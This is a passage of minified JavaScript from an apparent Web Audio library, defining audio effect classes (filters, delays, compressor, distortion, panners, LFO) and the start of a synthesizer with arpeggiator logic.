0!=t.sequencer&&this._sequencerName!=t.sequencer&&(this._sequencerName=t.sequencer,i=!0),this._initData={dummyClips:null,dummyUpbeats:null},t.content&&(this._initData.dummyClips=t.content,this._clips=[],i=!0),t.upbeats&&(this._initData.dummyUpbeats=t.upbeats,this._upbeats=[],i=!0),i&&(this._sequencer.unregisterPattern(this),this.init())},i}(u);e.Pattern=y;var m=function(){function e(e){this.active=!0,this._type=e.type,this._input=void 0!=t.context.createGain?t.context.createGain():t.context.createGainNode(),this._output=void 0!=t.context.createGain?t.context.createGain():t.context.createGainNode(),e.active===!1&&(this.active=!1)}return e.prototype.connect=function(t){return this._output.connect(t),this},e.prototype.disconnect=function(){return this._output.disconnect(),this},e.prototype.setActive=function(e){return t.warn("Effect: Invocation of abstract method: Effect.setActive in",this),this},Object.defineProperty(e.prototype,"input",{get:function(){return this._input},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"output",{get:function(){return this._output},enumerable:!0,configurable:!0}),e}();e.Effect=m;var v=function(e){function i(i){e.call(this,i),this._wet=t.context.createGain(),this._wet.gain.value=i.wet,this._input.connect(this._wet),this._input.connect(this._output),this.destinationName=i.destination_name,R.instance.pushToPreLoadInitStack(this)}return s(i,e),i.prototype.init=function(){var t=R.instance.findInstance(this.destinationName);t&&this._wet.connect(t.input)},i.prototype.setActive=function(t){return this._input.disconnect(),t?(this._input.connect(this._wet),this._input.connect(this._output)):this._input.connect(this._output),this},Object.defineProperty(i.prototype,"wet",{get:function(){return this._wet.gain},enumerable:!0,configurable:!0}),i.prototype.setData=function(t){void 0!=t.wet&&(this.wet.value=t.wet),t.destination_name!=this.destinationName&&(this.destinationName=t.destination_name,this._wet.disconnect(),this.init())},i}(m);e.EffectSend=v;var b=function(e){function i(i){if(e.call(this,i),this._filters=[],"Firefox"==t.detector.browser.name)return void this._input.connect(this._output);if(0==i.bands.length)t.warn("Equalizer: No bands specified"),this._input.connect(this.output);else{for(var n=0,s=i.bands.length;s>n;n++){var o=i.bands[n],r=t.context.createBiquadFilter();o.filter_type&&(r.type=U.safeFilterType(o.filter_type)),o.frequency&&(r.frequency.value=o.frequency),o.gain&&(r.gain.value=o.gain),o.Q&&(r.Q.value=o.Q),0==n?this._input.connect(r):this._filters[n-1].connect(r),this._filters.push(r)}this._filters[this._filters.length-1].connect(this._output)}}return s(i,e),i.prototype.addFilter=function(e,i,n,s){var o=t.context.createBiquadFilter();o.type=e,o.frequency.value=i,o.gain.value=s,o.Q.value=n,0==this._filters.length?(this._input.disconnect(),this._input.connect(o)):(this._filters[this._filters.length-1].disconnect(),this._filters[this._filters.length-1].connect(o)),o.connect(this.output),this._filters.push(o)},i.prototype.removeFilter=function(t){this._filters[t].disconnect(),0==t&&this._filters.length>1?(this._input.disconnect(),this._input.connect(this._filters[1])):0==t?(this._input.disconnect(),this._input.connect(this._output)):t==this._filters.length-1?(this._filters[t-1].disconnect(),this._filters[t-1].connect(this._output)):(this._filters[t-1].disconnect(),this._filters[t-1].connect(this._filters[t+1])),this._filters.splice(t,1)},i.prototype.setActive=function(t){return this._input.disconnect(),t?0==this._filters.length?this._input.connect(this._output):this._input.connect(this._filters[0]):this._input.connect(this._output),this},Object.defineProperty(i.prototype,"filters",{get:function(){return this._filters},enumerable:!0,configurable:!0}),i.prototype.setData=function(t){for(var e=0,i=this._filters.length;i>e;e++){var n=t.bands[e],s=this._filters[e];if(s&&n){s.frequency.value=n.frequency,s.Q.value=n.Q,s.gain.value=n.gain;var o=U.safeFilterType(n.filter_type);s.type!=o&&(s.type=o)}}},i}(m);e.Equalizer=b;var T=function(e){function i(i){e.call(this,i),this._filter=t.context.createBiquadFilter(),this._filter.type=U.safeFilterType(i.filter_type),this._input.connect(this._filter),this._filter.connect(this._output),this._filter.frequency.value=void 0!=i.frequency?i.frequency:1e3,this._filter.Q.value=void 0!=i.Q?i.Q:1,this._filter.gain.value=void 0!=i.gain?i.gain:0}return s(i,e),i.prototype.setActive=function(t){return this._input.disconnect(),t?this._input.connect(this._filter):this._input.connect(this._output),this},Object.defineProperty(i.prototype,"frequency",{get:function(){return this._filter.frequency},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"Q",{get:function(){return this._filter.Q},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"gain",{get:function(){return this._filter.gain},enumerable:!0,configurable:!0}),i.prototype.setData=function(t){void 0==t.filter_type&&(t.filter_type="lowpass"),this._filter.type!=t.filter_type&&(this._filter.type=U.safeFilterType(t.filter_type)),this._filter.frequency.value=void 0==t.frequency?1e3:t.frequency,this._filter.Q.value=void 0==t.Q?1:t.Q,this._filter.gain.value=void 0==t.gain?0:t.gain},i}(m);e.BiquadFilter=T;var S=function(e){function i(i){e.call(this,i),this._pro=t.context.createScriptProcessor(i.buffer_size||4096,2,2);var n=this;this._pro.onaudioprocess=function(t){for(var e=t.inputBuffer,i=t.outputBuffer,s=e.getChannelData(0),o=e.getChannelData(1),r=i.getChannelData(0),a=i.getChannelData(1),u=Math.pow(.5,n._bits),c=e.length,h=0,l=0,p=0,_=0;c>_;++_)(h+=n._reduction)>=1&&(h--,l=u*Math.floor(s[_]/u),p=u*Math.floor(o[_]/u)),r[_]=l,a[_]=p},this._bits=i.bits||4,this._reduction=i.reduction||.2,this._input.connect(this._pro),this._pro.connect(this._output)}return s(i,e),i.prototype.setActive=function(t){return this._input.disconnect(),t?(this._input.connect(this._pro),this._input.connect(this._output)):this._input.connect(this._output),this},Object.defineProperty(i.prototype,"bits",{get:function(){return this._bits},set:function(t){this._bits=t},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"reduction",{get:function(){return this._reduction},set:function(t){this._reduction=t},enumerable:!0,configurable:!0}),i.prototype.setData=function(t){this._bits=void 0!=t.bits?t.bits:4,this._reduction=void 0!=t.reduction?t.reduction:.2},i}(m);e.Bitcrusher=S;var O=function(e){function i(i){return e.call(this,i),this._bypass=i.bypass,t.isMobile?void this._input.connect(this._output):(this._dynamicsCompressor=t.context.createDynamicsCompressor(),this._makeUpGain=t.context.createGain(),this._input.connect(this._dynamicsCompressor),
this._dynamicsCompressor.connect(this._makeUpGain),this._makeUpGain.connect(this._output),this._bypass&&(this._input.connect(this._output),this._makeUpGain.gain.value=0),this._dynamicsCompressor.threshold.value=i.threshold||this._dynamicsCompressor.threshold.value,this._dynamicsCompressor.knee.value=i.knee||this._dynamicsCompressor.knee.value,this._dynamicsCompressor.ratio.value=i.ratio||this._dynamicsCompressor.ratio.value,this._dynamicsCompressor.attack.value=i.attack||this._dynamicsCompressor.attack.value,this._dynamicsCompressor.release.value=i.release||this._dynamicsCompressor.release.value,void(this._makeUpGain.gain.value=i.make_up_gain||this._makeUpGain.gain.value))}return s(i,e),i.prototype.setActive=function(t){return this._input.disconnect(),t?(this._input.connect(this._dynamicsCompressor),this._bypass&&this._input.connect(this._output)):this._input.connect(this._output),this},Object.defineProperty(i.prototype,"threshold",{get:function(){return this._dynamicsCompressor.threshold},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"knee",{get:function(){return this._dynamicsCompressor.knee},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"ratio",{get:function(){return this._dynamicsCompressor.ratio},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"attack",{get:function(){return this._dynamicsCompressor.attack},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"release",{get:function(){return this._dynamicsCompressor.release},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"reduction",{get:function(){return this._dynamicsCompressor.reduction},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"makeUpGain",{get:function(){return this._makeUpGain.gain},enumerable:!0,configurable:!0}),i.prototype.setData=function(t){void 0!=t.threshold&&(this.threshold.value=t.threshold),void 0!=t.knee&&(this.knee.value=t.knee),void 0!=t.ratio&&(this.ratio.value=t.ratio),void 0!=t.attack&&(this.attack.value=t.attack),void 0!=t.release&&(this.release.value=t.release),void 0!=t.make_up_gain&&(this.makeUpGain.value=t.make_up_gain)},i}(m);e.Compressor=O;var P=function(e){function i(i){return e.call(this,i),t.isMobile?void this._input.connect(this._output):(this._soundName=i.sound,this._convolver=t.context.createConvolver(),this._wetGain=t.context.createGain(),this._dryGain=t.context.createGain(),this._wetGain.gain.value=1,this._dryGain.gain.value=0,this._wetGain.connect(this._convolver),this._dryGain.connect(this._output),this._input.connect(this._wetGain),this._input.connect(this._dryGain),this._convolver.connect(this._output),void R.instance.pushToPostLoadInitStack(this))}return s(i,e),i.prototype.dryWet=function(t){t=Math.max(0,Math.min(1,t)),this._wetGain.gain.value=t,this._dryGain.gain.value=1-t},i.prototype.setActive=function(t){return this._input.disconnect(),t?this._input.connect(this._convolver):this._input.connect(this._output),this},i.prototype.init=function(){var t=R.instance.findInstance(this._soundName);this._convolver.buffer=t.buffer},i.prototype.setData=function(t){t.sound&&t.sound!=this._soundName&&(this._soundName=t.sound,this.init())},i}(m);e.Convolver=P;var A=function(e){function i(t){e.call(this,t),this._sync=t.sync}return s(i,e),i.prototype.init=function(){if(this._sync){var t=R.instance.findInstance(this._sync);this.updateSync(t.bpm),t.registerBPMSync(this)}},i.prototype.setSync=function(t,e){return t?(this._sync=t,this._syncResolution=e||1,this.init()):(this._sync=null,this._syncResolution=null),this},i.prototype.setSyncRate=function(t){return this._sync&&(this._syncResolution=t,this.updateSync(R.instance.findInstance(this._sync).bpm)),this},i.prototype.updateSync=function(e){return t.warn("DelayBase: Invocation of abstract method: DelayBase.updateSync in",this),this},Object.defineProperty(i.prototype,"sync",{get:function(){return this._sync},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"syncResolution",{get:function(){return this._syncResolution},set:function(t){this._syncResolution=t},enumerable:!0,configurable:!0}),i}(m);e.DelayBase=A;var w=function(e){function i(i){e.call(this,i),this._feedback=t.context.createGain(),this._delay=t.context.createDelay(),i.filter?(this._filter=t.context.createBiquadFilter(),this._input.connect(this._filter),this._filter.connect(this._delay),this._filter.type=U.safeFilterType(i.filter.filter_type),this._filter.frequency.value=i.filter.frequency||1e3,this._filter.Q.value=i.filter.Q||4,this._filter.gain.value=i.filter.gain||1):this._input.connect(this._delay),this._delay.connect(this._feedback),this._delay.connect(this._output),this._feedback.connect(this._delay),this.sync?(R.instance.pushToPreLoadInitStack(this),this.syncResolution=i.delay_time||1):this._delay.delayTime.value=i.delay_time||.125,this._feedback.gain.value=i.feedback||.3,this._output.gain.value=i.output_vol||i.wet||1}return s(i,e),i.prototype.setActive=function(t){return this._input.disconnect(),t?this._input.connect(this._delay):this._input.connect(this._output),this},i.prototype.updateSync=function(t){return this._delay.delayTime.value=60/t*this.syncResolution,this},Object.defineProperty(i.prototype,"delayTime",{get:function(){return this._delay.delayTime},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"feedback",{get:function(){return this._feedback.gain},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"filter",{get:function(){return this._filter},enumerable:!0,configurable:!0}),i.prototype.setData=function(e){e.feedback&&(this._feedback.gain.value=e.feedback),e.sync?this.setSync(e.sync,e.delay_time):e.delay_time&&(this._delay.delayTime.value=e.delay_time),e.filter?(this._filter||(this.input.disconnect(),this._filter=t.context.createBiquadFilter(),this.input.connect(this._filter),this._filter.connect(this._delay)),void 0!=e.filter.filter_type&&(this._filter.type=U.safeFilterType(e.filter.filter_type)),void 0!=e.filter.frequency&&(this._filter.frequency.value=e.filter.frequency),void 0!=e.filter.Q&&(this._filter.Q.value=e.filter.Q),void 0!=e.filter.gain&&(this._filter.gain.value=e.filter.gain)):this._filter&&(this.input.disconnect(),this._filter.disconnect(),this.input.connect(this._delay),this._filter=null)},i}(A);e.Delay=w;var E=function(e){function i(i){return e.call(this,i),"Firefox"==t.detector.browser.name?void this._input.connect(this._output):(this._splitter=t.context.createChannelSplitter(2),this._merger=t.context.createChannelMerger(2),this._mono=t.context.createGain(),this._leftDelay=t.context.createDelay(),this._rightDelay=t.context.createDelay(),this._feedback=t.context.createGain(),i.filter?(this._filter=t.context.createBiquadFilter(),this._mono.connect(this._filter),this._filter.connect(this._leftDelay),this._feedback.connect(this._filter),this._filter.type=U.safeFilterType(i.filter.filter_type),this._filter.frequency.value=i.filter.frequency||1e3,this._filter.Q.value=i.filter.Q||4,this._filter.gain.value=i.filter.gain||1):(this._mono.connect(this._leftDelay),this._feedback.connect(this._leftDelay)),this._input.connect(this._splitter),this._splitter.connect(this._mono,0,0),this._splitter.connect(this._mono,1,0),this._leftDelay.connect(this._rightDelay),this._rightDelay.connect(this._feedback),this._leftDelay.connect(this._merger,0,0),this._rightDelay.connect(this._merger,0,1),this._merger.connect(this._output),this.sync?(R.instance.pushToPreLoadInitStack(this),this.syncResolution=i.delay_time||1):(this._leftDelay.delayTime.value=i.delay_time||.125,this._rightDelay.delayTime.value=this._leftDelay.delayTime.value),this._feedback.gain.value=i.feedback||.3,void(this._output.gain.value=i.output_vol||i.wet||1))}return s(i,e),i.prototype.setActive=function(t){return this._input.disconnect(),t?this._input.connect(this._splitter):this._input.connect(this._output),this},i.prototype.updateSync=function(t){return this._leftDelay.delayTime.value=60/t*this.syncResolution,this._rightDelay.delayTime.value=this._leftDelay.delayTime.value,this},Object.defineProperty(i.prototype,"delay_time",{set:function(t){this._leftDelay.delayTime.value=t,this._rightDelay.delayTime.value=t},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"feedback",{get:function(){return this._feedback.gain},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"filter",{get:function(){return this._filter},enumerable:!0,configurable:!0}),i.prototype.setData=function(e){e.feedback&&(this._feedback.gain.value=e.feedback),e.sync?this.setSync(e.sync,e.delay_time):e.delay_time&&(this._leftDelay.delayTime.value=e.delay_time,this._rightDelay.delayTime.value=e.delay_time),e.filter?(this._filter||(this._mono.disconnect(),this._feedback.disconnect(),this._filter=t.context.createBiquadFilter(),this._mono.connect(this._filter),this._filter.connect(this._leftDelay),this._feedback.connect(this._filter)),void 0!=e.filter.filter_type&&(this._filter.type=U.safeFilterType(e.filter.filter_type)),void 0!=e.filter.frequency&&(this._filter.frequency.value=e.filter.frequency),void 0!=e.filter.Q&&(this._filter.Q.value=e.filter.Q),void 0!=e.filter.gain&&(this._filter.gain.value=e.filter.gain)):this._filter&&(this._mono.disconnect(),this._feedback.disconnect(),this._filter.disconnect(),this._mono.connect(this._leftDelay),this._feedback.connect(this._leftDelay),this._filter=null)},i}(A);e.PingPongDelay=E;var x=function(e){function i(i){e.call(this,i),this.sync&&(i.left.sync=this.sync,i.right.sync=this.sync),this._splitter=t.context.createChannelSplitter(2),this._merger=t.context.createChannelMerger(2),this._leftDelay=new w(i.left||{}),this._rightDelay=new w(i.right||{}),this._input.connect(this._splitter),this._splitter.connect(this._leftDelay.input,0,0),this._splitter.connect(this._rightDelay.input,0,0),this._splitter.connect(this._rightDelay.input,1,0),this._leftDelay.output.connect(this._merger,0,0),this._rightDelay.output.connect(this._merger,0,1),this._merger.connect(this._output)}return s(i,e),i.prototype.setActive=function(t){return this._input.disconnect(),t?this._input.connect(this._splitter):this._input.connect(this._output),this},i.prototype.updateSync=function(t){return this._leftDelay.updateSync(t),this._rightDelay.updateSync(t),this},Object.defineProperty(i.prototype,"leftDelay",{get:function(){return this._leftDelay},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"rightDelay",{get:function(){return this._rightDelay},enumerable:!0,configurable:!0}),i.prototype.setData=function(t){this._leftDelay.setData(t.left),this._rightDelay.setData(t.right)},i}(A);e.StereoDelay=x;var k=function(e){function i(i){e.call(this,i),this._compressor=t.context.createDynamicsCompressor(),this._preGain=t.context.createGain(),this._postGain=t.context.createGain(),this._input.connect(this._preGain),this._preGain.connect(this._compressor),this._compressor.connect(this._postGain),this._postGain.connect(this._output),this._compressor.threshold.value=i.threshold||0,this._compressor.knee.value=0,this._compressor.ratio.value=100,this._compressor.attack.value=0,this._compressor.release.value=0,this._preGain.gain.value=void 0==i.pre_gain?1:i.pre_gain,this._postGain.gain.value=void 0==i.post_gain?1:i.post_gain}return s(i,e),i.prototype.setActive=function(t){return this._input.disconnect(),t?this._input.connect(this._preGain):this._input.connect(this._output),this},Object.defineProperty(i.prototype,"threshold",{get:function(){return this._compressor.threshold},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"preGain",{get:function(){return this._preGain.gain},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"postGain",{get:function(){return this._postGain.gain},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"reduction",{get:function(){return this._compressor.reduction},enumerable:!0,configurable:!0}),i.prototype.setData=function(t){void 0!=t.threshold&&(this._compressor.threshold.value=t.threshold),void 0!=t.pre_gain&&(this._preGain.gain.value=t.pre_gain),void 0!=t.post_gain&&(this._postGain.gain.value=t.post_gain)},i}(m);e.Limiter=k;var F=function(e){function i(n){e.call(this,n),this._name=n.name,this._panner=t.context.createPanner(),this._input.connect(this._panner),this._panner.connect(this._output),void 0!=n.panning_model&&(this._panner.panningModel=n.panning_model),void 0!=n.distance_model&&(this._panner.distanceModel=n.distance_model),void 0!=n.ref_distance&&(this._panner.refDistance=n.ref_distance),void 0!=n.max_distance&&(this._panner.maxDistance=n.max_distance),void 0!=n.rolloff_factor&&(this._panner.rolloffFactor=n.rolloff_factor),void 0!=n.cone_inner_angle&&(this._panner.coneInnerAngle=n.cone_inner_angle),void 0!=n.cone_outer_angle&&(this._panner.coneOuterAngle=n.cone_outer_angle),void 0!=n.cone_outer_gain&&(this._panner.coneOuterGain=n.cone_outer_gain),void 0!=n.position&&this._panner.setPosition(n.position[0],n.position[1],n.position[2]),void 0!=n.orientation&&this._panner.setOrientation(n.position[0],n.position[1],n.position[2]),i.panners[this._name]=this}return s(i,e),i.panners={},i._scale=1,i.prototype.setActive=function(t){return this._input.disconnect(),t?this._input.connect(this._panner):this._input.connect(this._output),this},i.prototype.setPosition=function(t,e,n){this._panner.setPosition(t*i.scale,e*i.scale,n*i.scale)},i.prototype.setOrientation=function(t,e,i){this._panner.setOrientation(t,e,i)},i.prototype.setVelocity=function(t,e,i){},i.prototype.setData=function(t){this._panner.setPosition(t.position[0],t.position[1],t.position[2]),this._panner.setOrientation(t.position[0],t.position[1],t.position[2]),void 0!=t.panning_model&&(this._panner.panningModel=t.panning_model),void 0!=t.distance_model&&(this._panner.distanceModel=t.distance_model),void 0!=t.ref_distance&&(this._panner.refDistance=t.ref_distance),void 0!=t.max_distance&&(this._panner.maxDistance=t.max_distance),void 0!=t.rolloff_factor&&(this._panner.rolloffFactor=t.rolloff_factor),void 0!=t.cone_inner_angle&&(this._panner.coneInnerAngle=t.cone_inner_angle),void 0!=t.cone_outer_angle&&(this._panner.coneOuterAngle=t.cone_outer_angle),void 0!=t.cone_outer_gain&&(this._panner.coneOuterGain=t.cone_outer_gain)},Object.defineProperty(i,"listener",{get:function(){return t.context.listener},enumerable:!0,configurable:!0}),i.setListenerPosition=function(e,n,s){t.context.listener.setPosition(e*i.scale,n*i.scale,s*i.scale)},i.setListenerOrientation=function(e,i,n,s,o,r){t.context.listener.setOrientation(e,i,n,s,o,r)},i.setListenerVelocity=function(t,e,i){},i.setDopplerFactor=function(t){},i.setSpeedOfSound=function(e){t.context.listener.speed=e},i.setListenerData=function(t){t&&(i.scale=t.scale,i.setListenerPosition(t.position[0],t.position[1],t.position[2]),i.setListenerOrientation(t.orientation[0],t.orientation[1],t.orientation[2],t.orientation_up[0],t.orientation_up[1],t.orientation_up[2]),i.setListenerVelocity(t.velocity[0],t.velocity[1],t.velocity[2]),i.setSpeedOfSound(t.speed_of_sound))},i.get=function(t){return i.panners[t]},Object.defineProperty(i,"scale",{get:function(){return i._scale},set:function(t){i._scale=t},enumerable:!0,configurable:!0}),i}(m);e.Panner=F;var C=function(e){function i(i){e.call(this,i),this._source=i.source,this._gain=t.context.createGain(),this._processor=t.context.createScriptProcessor(i.buffer_size||0);var n=this;this._processor.onaudioprocess=function(){var t=n._source.reduction.value;n._gain.gain.value=0==t?1:Math.pow(10,t/20)},this._input.connect(this._gain),this._input.connect(this._processor),this._processor.connect(t.context.destination),this._gain.connect(this._output),R.instance.pushToPreLoadInitStack(this)}return s(i,e),i.prototype.init=function(){this._source&&this._source.bus&&void 0!=this._source.index||t.warn("Sidechain: No source specified");var e=R.instance.findInstance(this._source.bus);this._source=e._effects[this._source.index]},i.prototype.setActive=function(t){return this._input.disconnect(),t?(this._input.connect(this._gain),this._input.connect(this._processor)):this._input.connect(this._output),this},i}(m);e.Sidechain=C;var I=function(e){function i(i){e.call(this,i),this._splitter=t.context.createChannelSplitter(2),this._merger=t.context.createChannelMerger(2),this._left=t.context.createGain(),this._right=t.context.createGain(),this._input.connect(this._splitter),this._splitter.connect(this._left,0,0),this._splitter.connect(this._right,1,0),this._left.connect(this._merger,0,0),this._right.connect(this._merger,0,1),this._merger.connect(this._output),this.pan=i.pan}return s(i,e),i.prototype.setActive=function(t){return this._input.disconnect(),t?this._input.connect(this._splitter):this._input.connect(this._output),this},i.prototype.getGainValue=function(t){return(t+1)/2},i.prototype.setPanTo=function(t,e){var i=this.getGainValue(t);return this._left.gain.setValueAtTime(1-i,e||0),this._right.gain.setValueAtTime(i,e||0),this},i.prototype.linPanTo=function(e,i,n){n=n||t.context.currentTime;var s=this.getGainValue(e);return this._left.gain.setValueAtTime(this._left.gain.value,n),this._left.gain.linearRampToValueAtTime(1-s,t.context.currentTime+i),this._right.gain.setValueAtTime(this._right.gain.value,n),this._right.gain.linearRampToValueAtTime(s,t.context.currentTime+i),this},i.prototype.expPanTo=function(e,i,n){n=n||t.context.currentTime;var s=this.getGainValue(e);return this._left.gain.setValueAtTime(0==this._left.gain.value?U.EXP_MIN_VALUE:this._left.gain.value,n),this._left.gain.exponentialRampToValueAtTime(1-s,t.context.currentTime+i),this._right.gain.setValueAtTime(0==this._right.gain.value?U.EXP_MIN_VALUE:this._right.gain.value,n),this._right.gain.exponentialRampToValueAtTime(s,t.context.currentTime+i),this},Object.defineProperty(i.prototype,"pan",{get:function(){return this._right.gain.value},set:function(t){var e=this.getGainValue(t);this._left.gain.value=1-e,this._right.gain.value=e},enumerable:!0,configurable:!0}),i.prototype.setData=function(t){void 0!=t.pan&&(this.pan=t.pan)},i}(m);e.StereoPanner=I;var V=function(e){function i(i,n){e.call(this,i),i.sync&&(this._sync=i.sync,this._rate=i.rate||.25),this._oscillator=t.context.createOscillator(),this._amplitude=t.context.createGain(),this._input.connect(this._output),this._oscillator.connect(this._amplitude),this._amplitude.connect(this._output.gain),this._oscillator.frequency.value=i.frequency||10,this._oscillator.type=i.wave||0,this._amplitude.gain.value=i.amplitude||1,this._oscillator.start(n),R.instance.pushToPreLoadInitStack(this)}return s(i,e),i.prototype.init=function(){if(this._sync){var t=R.instance.findInstance(this._sync);this.updateSync(t.bpm),t.registerBPMSync(this)}},i.prototype.setActive=function(t){return t?this._amplitude.connect(this._output.gain):this._amplitude.disconnect(),this},i.prototype.updateSync=function(t){return this._oscillator.frequency.value=t/60/this._rate,this},Object.defineProperty(i.prototype,"frequency",{get:function(){return this._oscillator.frequency},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"amplitude",{get:function(){return this._amplitude.gain},enumerable:!0,configurable:!0}),i.prototype.setData=function(t){void 0!=t.amplitude&&(this.amplitude.value=t.amplitude),void 0!=t.wave&&(this._oscillator.type=t.wave),t.sync?(this._sync=t.sync,this._rate=t.rate||.25,this.init()):void 0!=t.frequency&&(this.frequency.value=t.frequency)},i}(m);e.Tremolo=V;var D=function(e){function i(i){e.call(this,i),this._samples=8192,this._distortionType=i.distortion_type||0,this._amount=i.amount||.7,this._samples=8192,this._waveshaper=t.context.createWaveShaper(),this._inputDrive=t.context.createGain(),this._outputDrive=t.context.createGain(),this._input.connect(this._inputDrive),this._inputDrive.connect(this._waveshaper),this._waveshaper.connect(this._outputDrive),this._outputDrive.connect(this._output),this._ws_table=new Float32Array(this._samples),this.createWSCurve(this._distortionType,this._amount),this._inputDrive.gain.value=i.drive||.5,this._outputDrive.gain.value=i.outputGain||.5}return s(i,e),i.prototype.createWSCurve=function(t,e){switch(t){case 0:var i,n,e=Math.min(e,.9999),s=2*e/(1-e);for(i=0;i<this._samples;i++)n=2*i/this._samples-1,this._ws_table[i]=(1+s)*n/(1+s*Math.abs(n));break;case 1:var i,n,o;for(i=0;i<this._samples;i++)n=2*i/this._samples-1,o=(.5*Math.pow(n+1.4,2)-1)*o>=0?5.8:1.2,this._ws_table[i]=this.tanh(o);break;case 2:var i,n,o,r=1-e;for(i=0;i<this._samples;i++)n=2*i/this._samples-1,o=0>n?-Math.pow(Math.abs(n),r+.04):Math.pow(n,r),this._ws_table[i]=this.tanh(2*o);break;case 3:var i,n,o,a,r=1-e>.99?.99:1-e;for(i=0;i<this._samples;i++)n=2*i/this._samples-1,a=Math.abs(n),r>a?o=a:a>r?o=r+(a-r)/(1+Math.pow((a-r)/(1-r),2)):a>1&&(o=a),this._ws_table[i]=this.sign(n)*o*(1/((r+1)/2));break;case 4:var i,n;for(i=0;i<this._samples;i++)n=2*i/this._samples-1,-.08905>n?this._ws_table[i]=-3/4*(1-Math.pow(1-(Math.abs(n)-.032857),12)+1/3*(Math.abs(n)-.032847))+.01:n>=-.08905&&.320018>n?this._ws_table[i]=-6.153*(n*n)+3.9375*n:this._ws_table[i]=.630035;break;case 5:var i,n,r=2+Math.round(14*e),u=Math.round(Math.pow(2,r-1));for(i=0;i<this._samples;i++)n=2*i/this._samples-1,this._ws_table[i]=Math.round(n*u)/u}this._waveshaper.curve=this._ws_table},i.prototype.tanh=function(t){return(Math.exp(t)-Math.exp(-t))/(Math.exp(t)+Math.exp(-t))},i.prototype.sign=function(t){return 0===t?1:Math.abs(t)/t},i.prototype.setActive=function(t){return this._input.disconnect(),t?this._input.connect(this._inputDrive):this._input.connect(this._output),this},Object.defineProperty(i.prototype,"amount",{get:function(){return this._amount},set:function(t){this._amount=t,this.createWSCurve(this._distortionType,this._amount)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"distortionType",{get:function(){return this._distortionType},set:function(t){this._distortionType=t,this.createWSCurve(this._distortionType,this._amount)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"drive",{get:function(){return this._inputDrive.gain},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"outputGain",{get:function(){return this._outputDrive.gain},enumerable:!0,configurable:!0}),i.prototype.setData=function(t){void 0!=t.amount&&(this.amount=t.amount),void 0!=t.distortion_type&&(this.distortionType=t.distortion_type),void 0!=t.drive&&(this._inputDrive.gain.value=t.drive),void 0!=t.outputGain&&(this._outputDrive.gain.value=t.outputGain)},i}(m);e.Distortion=D;var M=function(){function e(e,i){i=i||0,this._targets=e.targets,this._sync=e.sync,this._rate=e.rate||1,this._phaseVal=e.phase||0,this._oscillator=t.context.createOscillator(),this._oscillator.type=e.wave||"sine",this._oscillator.frequency.value=this._rate,this._amplitude=t.context.createGain(),this._amplitude.gain.value=e.amplitude||1,this._phase=t.context.createDelay(),this._phase.delayTime.value=this._phaseVal*(1/this._oscillator.frequency.value),this._oscillator.connect(this._phase),this._phase.connect(this._amplitude),this._oscillator.start(i),R.instance.pushToPreLoadInitStack(this)}return e.prototype.init=function(){if(this._sync){var e=R.instance.findInstance(this._sync);this.updateSync(e.bpm),e.registerBPMSync(this)}for(var i=0,n=this._targets.length;n>i;i++){var s=this._targets[i],o=R.instance.findInstance(s.bus),r=o.effects[s.effect];r||t.warn("LFO: Effect index out of bounds: "+s.effect),r[s.param]||t.warn("LFO: Parameter not recognized: "+s.param),this._amplitude.connect(r[s.param])}},e.prototype.updateSync=function(t){return this._oscillator.frequency.value=t/60/this._rate,this._phase.delayTime.value=this._phaseVal*(1/this._oscillator.frequency.value),this},e.prototype.setData=function(t){this._oscillator.type=t.wave,this._oscillator.frequency.value=t.rate,this._phase.delayTime.value=t.phase*(1/this._oscillator.frequency.value),this._amplitude.gain.value=t.amplitude||1,t.targets&&(this._targets=t.targets,this.init()),this._sync!=t.sync&&(this._sync=t.sync,this.init())},e}();e.LFO=M;var N=function(){function e(e,i){this._arpCounter=0,this._arpNoteLength=.5,this._arpPattern=[],this._arpPatternStep=0,this._name=i,this._type=e.type,this._output=t.context.createGain(),this._output.gain.value=e.volume||1,e.destination_name&&(this.destinationName=e.destination_name,R.instance.initComplete||R.instance.pushToConnectStack(this)),e.arp?(this._arpMode=e.arp.arp_mode||"off",this._octaves=e.arp.octaves||1,this._sync=e.arp.sync,this._arpPattern=e.arp.arp_pattern||[]):this._arpMode="off",this._activeVoices=[],this._arpVoices=[],this._beatSubscription=e.beat_subscription||.25,this.data=e}return e.prototype.connect=function(t){return this._output.connect(t),this},e.prototype.disconnect=function(){return this._output.disconnect(),this},e.prototype.handleMidiEvent=function(e,i,n,s){return t.warn("Synth: Invocation of abstract method: Synth.handleMidiEvent in",this),this},e.prototype.stop=function(){t.warn("Synth: Invocation of abstract method: Synth.stop in",this)},e.prototype.handleArpModes=function(t){if(this._arpVoices=[],this._octaves>1){for(var e=[],i=0;i<this._octaves-1;i++)for(var n=0;n<this._activeVoices.length;n++){var s=this._activeVoices[n].midiEvent,o=s.noteNumber,r={type:"channel",subtype:s.subtype,noteNumber:o+=12*(i+1),velocity:s.velocity,deltaTime:s.deltaTime};e.push({midiEvent:r,transpose:this._activeVoices[n].transpose})}this._arpVoices=this._activeVoices.concat(e)}else this._arpVoices=this._activeVoices;if("up"===this._arpMode)this._arpVoices=this._arpVoices.sort(this.sortVoices);else if("down"===this._arpMode)this._arpVoices=this._arpVoices.sort(this.sortVoices),this._arpVoices.reverse();else if("up-down"===this._arpMode){var 